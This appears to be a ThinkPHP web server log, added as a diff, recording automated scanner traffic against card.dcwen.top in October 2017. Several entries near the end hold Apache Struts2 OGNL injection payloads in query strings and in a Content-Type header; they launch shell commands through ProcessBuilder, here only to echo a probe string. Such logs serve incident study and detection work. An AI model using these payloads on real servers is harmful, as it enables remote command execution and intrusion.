@@ -1,0 +1,1408 @@
+---------------------------------------------------------------
+[ 2017-10-01T05:11:25+08:00 ] 172.16.0.5 180.97.79.28 GET /
+[ info ] card.dcwen.top/ [运行时间：0.015145s][吞吐率：66.03req/s] [内存消耗：548.12kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:11:57+08:00 ] 172.16.0.5 180.97.106.163 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.002680s][吞吐率：373.16req/s] [内存消耗：545.22kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-cache-after' => '20170930091157',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'miner-speed-quota' => '100-1',
+  'miner-worker' => 'Spider',
+  'miner-task-id' => '255125769',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:11:57+08:00 ] 172.16.0.5 180.97.106.39 GET /admin/login/show_login.html
+[ info ] card.dcwen.top:80/admin/login/show_login.html [运行时间：0.010260s][吞吐率：97.46req/s] [内存消耗：1,737.88kb] [文件加载：59]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'show_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'redirect' => '1',
+  'miner-cache-after' => '20170930091157',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'miner-speed-quota' => '100-1',
+  'miner-worker' => 'Spider',
+  'miner-task-id' => '255125769',
+)
+[ info ] [ PARAM ] array (
+  '/admin/login/show_login_html' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->show_login[ /var/www/card/app/admin/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/card/app/admin/view/login/login_page.html [ array (
+) ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000193s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000608s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000141s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000118s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000104s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_widgets` [ RunTime:0.000489s ]
+[ sql ] [ SQL ] SELECT `wid_params` FROM `edd_widgets` WHERE  `wid_key` = 'lsm_verify' LIMIT 1 [ RunTime:0.000235s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000119s ]
+---------------------------------------------------------------
+[ 2017-10-01T05:12:00+08:00 ] 172.16.0.5 180.97.106.164 GET /notexist_path
+[ info ] card.dcwen.top:80/notexist_path [运行时间：0.007698s][吞吐率：129.90req/s] [内存消耗：448.95kb] [文件加载：41]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'notexist_path',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept' => 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
+  'miner-speed-quota' => '100-1',
+  'miner-cache-after' => '20170930091157',
+  'miner-worker' => 'Spider',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-speed-session' => '255125769-1506805919.7',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'accept-encoding' => 'gzip',
+  'accept-language' => 'en,*',
+)
+[ info ] [ PARAM ] array (
+  '/notexist_path' => '',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:03+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.007497s][吞吐率：133.39req/s] [内存消耗：546.41kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept' => 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
+  'miner-speed-quota' => '100-1',
+  'miner-cache-after' => '20170930091157',
+  'miner-worker' => 'Spider',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-speed-session' => '255125769-1506805921.9',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'accept-encoding' => 'gzip',
+  'accept-language' => 'en,*',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:03+08:00 ] 172.16.0.5 180.97.106.39 GET /admin/login/show_login.html
+[ info ] card.dcwen.top:80/admin/login/show_login.html [运行时间：0.007982s][吞吐率：125.28req/s] [内存消耗：1,735.09kb] [文件加载：59]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'show_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept' => 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
+  'miner-speed-quota' => '100-1',
+  'miner-cache-after' => '20170930091157',
+  'miner-worker' => 'Spider',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-speed-session' => '255125769-1506805921.9',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'cookie' => 'PHPSESSID=0s6lpfnoh8kmkrt8ns2027a8d6',
+  'accept-encoding' => 'gzip',
+  'accept-language' => 'en,*',
+)
+[ info ] [ PARAM ] array (
+  '/admin/login/show_login_html' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->show_login[ /var/www/card/app/admin/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/card/app/admin/view/login/login_page.html [ array (
+) ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000253s ] mysql:dbname=runfast;host=localhost;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_options` [ RunTime:0.000772s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000136s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000116s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_widgets` [ RunTime:0.000571s ]
+[ sql ] [ SQL ] SELECT `wid_params` FROM `edd_widgets` WHERE  `wid_key` = 'lsm_verify' LIMIT 1 [ RunTime:0.000245s ]
+[ sql ] [ SQL ] SELECT `option_value` FROM `edd_options` WHERE  `option_id` = 6 LIMIT 1 [ RunTime:0.000139s ]
+---------------------------------------------------------------
+[ 2017-10-01T05:12:07+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.008496s][吞吐率：117.70req/s] [内存消耗：545.58kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-cache-after' => '20170930091157',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1',
+  'miner-speed-quota' => '100-1',
+  'miner-worker' => 'Spider',
+  'miner-task-id' => '255125769',
+  'miner-speed-session' => '255125769-1506805921.9',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:38+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003380s][吞吐率：295.85req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'php_cmd',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:38+08:00 ] 172.16.0.5 180.97.106.164 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.007169s][吞吐率：139.49req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'php_cmd',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:38+08:00 ] 172.16.0.5 180.97.106.163 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.002894s][吞吐率：345.55req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'php_cmd',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:38+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003383s][吞吐率：295.60req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'php_cmd',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:38+08:00 ] 172.16.0.5 180.97.106.39 GET /
+[ info ] card.dcwen.top:80/ [运行时间：0.003352s][吞吐率：298.34req/s] [内存消耗：546.30kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top:80',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-overwrite-referer' => '',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-worker' => 'php_cmd',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:39+08:00 ] 172.16.0.5 180.97.106.163 GET /?struts&(a)(('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(z))&(b)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(z))&(c)(('\u0023_memberAccess.excludeProperties\u003d{}')(z))&(d)(('\u0023a_str\u003d\'814F60BD-F6DF-4227-\'')(z))&(e)(('\u0023b_str\u003d\'86F5-8D9FBF26A2EB\'')(z))&(n)(('\u0023a_resp\u003d@org.apache.struts2.ServletActionContext@getResponse()')(z))&(o)(('\u0023a_resp.getWriter().println(\u0023a_str\u002B\u0023b_str)')(z))&(p)(('\u0023a_resp.getWriter().flush()')(z))&(q)(('\u0023a_resp.getWriter().close()')(z))
+[ info ] card.dcwen.top/?struts&(a)(('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(z))&(b)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(z))&(c)(('\u0023_memberAccess.excludeProperties\u003d{}')(z))&(d)(('\u0023a_str\u003d\'814F60BD-F6DF-4227-\'')(z))&(e)(('\u0023b_str\u003d\'86F5-8D9FBF26A2EB\'')(z))&(n)(('\u0023a_resp\u003d@org.apache.struts2.ServletActionContext@getResponse()')(z))&(o)(('\u0023a_resp.getWriter().println(\u0023a_str\u002B\u0023b_str)')(z))&(p)(('\u0023a_resp.getWriter().flush()')(z))&(q)(('\u0023a_resp.getWriter().close()')(z)) [运行时间：0.003230s][吞吐率：309.59req/s] [内存消耗：556.80kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-overwrite-referer' => '',
+  'miner-worker' => 'struts_cmd',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+  'content-type' => '%{(#saolei=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'echo c6a2fa5f-142e-4278-8aa6-3047a677d699\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
+)
+[ info ] [ PARAM ] array (
+  'struts' => '',
+  '(a)((\'\\u0023_memberAccess_allowStaticMethodAccess\\u003dtrue\')(z))' => '',
+  '(b)((\'\\u0023context' => 
+  array (
+    '\\\'xwork.MethodAccessor.denyMethodExecution\\\'' => '',
+  ),
+  '(c)((\'\\u0023_memberAccess_excludeProperties\\u003d{}\')(z))' => '',
+  '(d)((\'\\u0023a_str\\u003d\\\'814F60BD-F6DF-4227-\\\'\')(z))' => '',
+  '(e)((\'\\u0023b_str\\u003d\\\'86F5-8D9FBF26A2EB\\\'\')(z))' => '',
+  '(n)((\'\\u0023a_resp\\u003d@org_apache_struts2_ServletActionContext@getResponse()\')(z))' => '',
+  '(o)((\'\\u0023a_resp_getWriter()_println(\\u0023a_str\\u002B\\u0023b_str)\')(z))' => '',
+  '(p)((\'\\u0023a_resp_getWriter()_flush()\')(z))' => '',
+  '(q)((\'\\u0023a_resp_getWriter()_close()\')(z))' => '',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:43+08:00 ] 172.16.0.5 180.97.106.163 GET /?k=%27%2B%28%23context%5B%5C%22xwork.MethodAccessor.denyMethodExecution%5C%22%5D=new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%5C%22allowStaticMethodAccess%5C%22%5D=new%20java.lang.Boolean%28true%29%2C%23_memberAccess.excludeProperties=%7B%7D%2C%23a_str=%27814F60BD-F6DF-4227-%27%2C%23b_str=%2786F5-8D9FBF26A2EB%27%2C%23a_resp=%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23a_resp.getWriter%28%29.println%28%23a_str%2B%23b_str%29%2C%23a_resp.getWriter%28%29.flush%28%29%2C%23a_resp.getWriter%28%29.close%28%29%29%2B%27
+[ info ] card.dcwen.top/?k=%27%2B%28%23context%5B%5C%22xwork.MethodAccessor.denyMethodExecution%5C%22%5D=new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%5C%22allowStaticMethodAccess%5C%22%5D=new%20java.lang.Boolean%28true%29%2C%23_memberAccess.excludeProperties=%7B%7D%2C%23a_str=%27814F60BD-F6DF-4227-%27%2C%23b_str=%2786F5-8D9FBF26A2EB%27%2C%23a_resp=%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23a_resp.getWriter%28%29.println%28%23a_str%2B%23b_str%29%2C%23a_resp.getWriter%28%29.flush%28%29%2C%23a_resp.getWriter%28%29.close%28%29%29%2B%27 [运行时间：0.003046s][吞吐率：328.30req/s] [内存消耗：553.20kb] [文件加载：53]
+[ info ] [ LANG ] /var/www/card/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'card.dcwen.top',
+  'connection' => 'close',
+  'accept-encoding' => 'identity',
+  'miner-overwrite-cookie' => '',
+  'miner-task-id' => '255125769',
+  'miner-timeout' => '90',
+  'accept-language' => 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
+  'miner-overwrite-user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 LVS',
+  'miner-speed-quota' => '100-1',
+  'cookie' => '',
+  'miner-overwrite-referer' => '',
+  'miner-worker' => 'struts_cmd',
+  'miner-cache-after' => '20130219123800',
+  'miner-hosts' => '',
+  'content-type' => '%{(#saolei=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'echo c6a2fa5f-142e-4278-8aa6-3047a677d699\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
+)
+[ info ] [ PARAM ] array (
+  'k' => '\'+(#context[\\"xwork.MethodAccessor.denyMethodExecution\\"]=new java.lang.Boolean(false),#_memberAccess[\\"allowStaticMethodAccess\\"]=new java.lang.Boolean(true),#_memberAccess.excludeProperties={},#a_str=\'814F60BD-F6DF-4227-\',#b_str=\'86F5-8D9FBF26A2EB\',#a_resp=@org.apache.struts2.ServletActionContext@getResponse(),#a_resp.getWriter().println(#a_str+#b_str),#a_resp.getWriter().flush(),#a_resp.getWriter().close())+\'',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-10-01T05:12:43+08:00 ] 172.16.0.5 180.97.106.164 GET /?k=%27%2B%28%23context%5B%5C%22xwork.MethodAccessor.denyMethodExecution%5C%22%5D=new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%5C%22allowStaticMethodAccess%5C%22%5D=new%20java.lang.Boolean%28true%29%2C%23_memberAccess.excludeProperties=%7B%7D%2C%23a_str=%27814F60BD-F6DF-4227-%27%2C%23b_str=%2786F5-8D9FBF26A2EB%27%2C%23a_resp=%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23a_resp.getWriter%28%29.println%28%23a_str%2B%23b_str%29%2C%23a_resp.getWriter%28%29.flush%28%29%2C%23a_resp.getWriter%28%29.close%28%29%29%2B%27
